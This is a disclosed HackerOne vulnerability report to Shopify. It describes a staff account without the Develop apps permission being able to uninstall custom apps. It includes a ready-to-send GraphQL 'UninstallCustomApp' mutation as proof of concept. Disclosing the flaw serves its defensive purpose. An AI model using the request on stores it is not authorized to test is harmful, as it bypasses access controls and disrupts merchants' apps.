# User with no Develop apps permission can Uninstall Custom App

## Report Details
- **Report ID**: 1466855
- **URL**: https://hackerone.com/reports/1466855
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-02-01T14:42:01.545Z
- **Disclosed**: 2022-04-21T20:33:37.262Z

## Reporter
- **Username**: ayyoub
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

You know user must have Develop apps permission to Uninstall  Develop apps 
to test this just create staff with `Manage and install apps and channels`

{F1601504}

send this mutation just change appId by your id

```
{"operationName":"UninstallCustomApp","variables":{"appId":"gid://shopify/App/6431893"},"query":"mutation UninstallCustomApp($appId: ID!) {\n  appUninstall(input: {id: $appId}) {\n    app {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## Impact

User with no Develop apps permission can Uninstall Custom App

## Attachments
- uninstallapp_(1).PNG
